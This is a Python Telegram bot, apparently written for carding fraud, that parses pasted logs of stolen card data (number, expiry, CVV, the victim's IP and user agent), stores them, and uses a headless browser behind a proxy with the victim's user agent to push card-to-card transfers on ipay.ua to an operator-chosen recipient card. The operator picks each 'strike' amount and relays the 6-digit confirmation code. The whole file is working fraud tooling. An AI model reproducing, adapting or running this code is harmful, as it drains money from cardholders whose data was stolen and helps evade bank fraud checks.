import os
import re
import sqlite3
import asyncio
from datetime import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
from aiogram.contrib.middlewares.logging import LoggingMiddleware
from aiogram.utils import executor
from playwright.async_api import async_playwright
from flask import Flask
import threading

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
DB_PATH = "/var/data/sessions.db"

app = Flask(__name__)
@app.route('/ping')
def ping(): return "OK", 200
def run_flask(): app.run(host='0.0.0.0', port=10000)
threading.Thread(target=run_flask, daemon=True).start()

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)
dp.middleware.setup(LoggingMiddleware())

def get_main_menu():
    kb = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    kb.add(KeyboardButton("🏠 Главное меню"), KeyboardButton("⚙️ Админ-панель"))
    return kb

def init_db():
    os.makedirs("/var/data", exist_ok=True)
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        card_from TEXT, expiry TEXT, cvv TEXT,
        ip TEXT, user_agent TEXT,
        amount INTEGER,
        card_to TEXT,
        status TEXT,
        msg_id INTEGER,
        timestamp TEXT
    )""")
    c.execute("""CREATE TABLE IF NOT EXISTS settings (
        key TEXT PRIMARY KEY,
        value TEXT
    )""")
    c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('card_to', '')")
    c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('proxy', '')")
    c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('default_amount', '1000')")
    conn.commit()
    conn.close()

def get_setting(key):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT value FROM settings WHERE key = ?", (key,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else None

def set_setting(key, value):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, value))
    conn.commit()
    conn.close()

def create_session(data, msg_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""INSERT INTO sessions
        (card_from, expiry, cvv, ip, user_agent, card_to, status, msg_id, timestamp)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
        (data['card'], data['expiry'], data['cvv'], data['ip'],
         data['user_agent'], get_setting('card_to'), 'waiting_amount', msg_id, datetime.now().isoformat()))
    session_id = c.lastrowid
    conn.commit()
    conn.close()
    return session_id

def update_session(session_id, field, value):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute(f"UPDATE sessions SET {field} = ? WHERE id = ?", (value, session_id))
    conn.commit()
    conn.close()

def get_session_by_msg(msg_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT * FROM sessions WHERE msg_id = ? AND status IN ('waiting_amount', 'waiting_code')", (msg_id,))
    row = c.fetchone()
    conn.close()
    return row

def get_session(session_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT * FROM sessions WHERE id = ?", (session_id,))
    row = c.fetchone()
    conn.close()
    return row

def parse_log(text):
    data = {"card": None, "expiry": None, "cvv": None, "ip": None, "user_agent": None}
    lines = text.split("\n")
    for line in lines:
        if "Номер:" in line or "💳" in line:
            match = re.search(r"\d{15,16}", line)
            if match: data["card"] = match.group()
        if "Истекает:" in line or "📅" in line:
            match = re.search(r"\d{2}[/-]?\d{2,4}", line)
            if match: data["expiry"] = match.group()
        if "CVV:" in line or "🎳" in line:
            match = re.search(r"\b\d{3}\b", line)
            if match: data["cvv"] = match.group()
        if "IP:" in line or "🌍" in line:
            match = re.search(r"\d+\.\d+\.\d+\.\d+", line)
            if match: data["ip"] = match.group()
        if "User-Agent:" in line or "👻" in line:
            parts = line.split(":", 1)
            if len(parts) > 1: data["user_agent"] = parts[1].strip()
    if not data["ip"]: data["ip"] = get_setting('proxy') or "auto"
    if not data["user_agent"]: data["user_agent"] = "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36"
    return data

async def emulate_payment(session_id, code=None):
    session = get_session(session_id)
    if not session: return "Сессия не найдена"
    card, expiry, cvv, ip, ua, amount, card_to = session[1], session[2], session[3], session[4], session[5], session[6], session[7]
    if not card_to: return "❌ Карта получателя не задана! Используй /set_card"
    expiry = expiry.replace("/", "").strip()
    if len(expiry) == 4: expiry = expiry[:2] + "/" + expiry[2:]
    proxy = get_setting('proxy')
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True, proxy={"server": proxy} if proxy else None)
        context = await browser.new_context(user_agent=ua or "Mozilla/5.0 (Linux; Android 10)", locale="uk-UA", timezone_id="Europe/Kyiv")
        page = await context.new_page()
        await page.goto("https://ipay.ua/card2card")
        await page.fill('input[name="card_from"]', card)
        await page.fill('input[name="expiry"]', expiry)
        await page.fill('input[name="cvv"]', cvv)
        await page.fill('input[name="card_to"]', card_to)
        await page.fill('input[name="amount"]', str(amount))
        await page.click('button[type="submit"]')
        await asyncio.sleep(3)
        if await page.is_visible('input[name="code"]'):
            if code:
                await page.fill('input[name="code"]', code)
                await page.click('button[type="submit"]')
                await asyncio.sleep(2)
                return "✅ Платёж подтверждён!"
            else:
                await asyncio.sleep(60)
                if await page.is_visible('button:has-text("Отправить код")'):
                    await page.click('button:has-text("Отправить код")')
                    return "waiting_code"
        if await page.is_visible('.success'):
            return "✅ Платёж выполнен успешно!"
        error_text = await page.text_content('.error')
        return f"❌ Ошибка: {error_text or 'неизвестная'}"

@dp.message_handler(commands=['start'])
async def start_cmd(msg: types.Message):
    if msg.from_user.id != ADMIN_ID: return
    await msg.reply("🏦 Бот активирован. Шли лог.", reply_markup=get_main_menu())

@dp.message_handler(commands=['set_card'])
async def set_card(msg: types.Message):
    if msg.from_user.id != ADMIN_ID: return
    parts = msg.text.split()
    if len(parts) < 2: await msg.reply("❌ Используй: /set_card 5168755432101234"); return
    set_setting('card_to', parts[1])
    await msg.reply(f"✅ Карта получателя: {parts[1]}")

@dp.message_handler(commands=['set_proxy'])
async def set_proxy(msg: types.Message):
    if msg.from_user.id != ADMIN_ID: return
    parts = msg.text.split()
    if len(parts) < 2: await msg.reply("❌ Используй: /set_proxy socks5://user:pass@ip:port"); return
    set_setting('proxy', parts[1])
    await msg.reply("✅ Прокси обновлён")

@dp.message_handler(commands=['set_amount'])
async def set_amount(msg: types.Message):
    if msg.from_user.id != ADMIN_ID: return
    parts = msg.text.split()
    if len(parts) < 2 or not parts[1].isdigit(): await msg.reply("❌ Используй: /set_amount 5000"); return
    set_setting('default_amount', parts[1])
    await msg.reply(f"✅ Сумма по умолчанию: {parts[1]} UAH")

@dp.message_handler(lambda msg: msg.text == "🏠 Главное меню")
async def main_menu(msg: types.Message):
    if msg.from_user.id != ADMIN_ID: return
    await msg.reply("🏠 Главное меню. Отправьте лог.", reply_markup=get_main_menu())

@dp.message_handler(lambda msg: msg.text == "⚙️ Админ-панель")
async def admin_panel(msg: types.Message):
    if msg.from_user.id != ADMIN_ID: return
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("💳 Карта", callback_data="change_card"),
        InlineKeyboardButton("🔄 Прокси", callback_data="change_proxy"),
        InlineKeyboardButton("💰 Сумма", callback_data="change_amount"),
        InlineKeyboardButton("📋 Статус", callback_data="show_status"),
    )
    await msg.reply("🏦 Админ-панель", reply_markup=kb)

@dp.callback_query_handler(lambda c: c.data.startswith("change_"))
async def settings_callback(callback: types.CallbackQuery):
    action = callback.data.split("_")[1]
    prompts = {"card": "Введите новый номер карты получателя:", "proxy": "Введите новый прокси:", "amount": "Введите сумму по умолчанию (UAH):"}
    await callback.message.reply(prompts.get(action, "Ошибка"))
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data == "show_status")
async def show_status(callback: types.CallbackQuery):
    card = get_setting('card_to') or "не задана"
    proxy = get_setting('proxy') or "не задан"
    amount = get_setting('default_amount') or "не задана"
    await callback.message.reply(f"📊 Настройки:\n💳 Карта: {card}\n🔄 Прокси: {proxy}\n💰 Сумма: {amount} UAH")
    await callback.answer()

@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.reply_to_message)
async def handle_reply(msg: types.Message):
    text = msg.reply_to_message.text
    user_input = msg.text.strip()

    if "сумму удара" in text:
        if not user_input.isdigit():
            await msg.reply("❌ Введи число!")
            return
        amount = int(user_input)
        session = get_session_by_msg(msg.reply_to_message.message_id)
        if not session:
            await msg.reply("❌ Сессия не найдена. Отправь лог заново.")
            return
        session_id = session[0]
        update_session(session_id, 'amount', amount)
        update_session(session_id, 'status', 'processing')
        await msg.reply(f"🚀 Платёж на {amount} UAH...")
        result = await emulate_payment(session_id)
        if result == "waiting_code":
            update_session(session_id, 'status', 'waiting_code')
            code_msg = await msg.reply("🔐 Введите 6-значный код (ответьте):")
            update_session(session_id, 'msg_id', code_msg.message_id)
        else:
            update_session(session_id, 'status', 'completed' if "✅" in result else 'failed')
            await msg.reply(result)
        return

    if "код" in text:
        if not user_input.isdigit() or len(user_input) != 6:
            await msg.reply("❌ 6 цифр!")
            return
        session = get_session_by_msg(msg.reply_to_message.message_id)
        if not session:
            await msg.reply("❌ Сессия не найдена.")
            return
        session_id = session[0]
        await msg.reply("🔄 Подтверждаю...")
        result = await emulate_payment(session_id, user_input)
        update_session(session_id, 'status', 'completed' if "✅" in result else 'failed')
        await msg.reply(result)
        return

    if "номер карты" in text:
        set_setting('card_to', user_input)
        await msg.reply("✅ Карта обновлена!")
    elif "прокси" in text:
        set_setting('proxy', user_input)
        await msg.reply("✅ Прокси обновлён!")

@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and len(msg.text) > 20 and not msg.reply_to_message and msg.text not in ["🏠 Главное меню", "⚙️ Админ-панель"])
async def handle_log(msg: types.Message):
    data = parse_log(msg.text)
    if not data["card"] or not data["expiry"] or not data["cvv"]:
        await msg.reply("❌ Не удалось распознать данные.")
        return
    session_id = create_session(data, msg.message_id)
    await msg.reply(
        f"✅ Данные распознаны:\n💳 Карта: {data['card'][:4]}****{data['card'][-4:]}\n"
        f"📅 Срок: {data['expiry']}\n🎳 CVV: ***\n🌍 IP: {data['ip']}\n"
        f"👻 UA: {data['user_agent'][:30]}...\n\n"
        f"💰 Введите сумму удара (ответьте на это сообщение):"
    )

if __name__ == "__main__":
    init_db()
    executor.start_polling(dp, skip_updates=True)
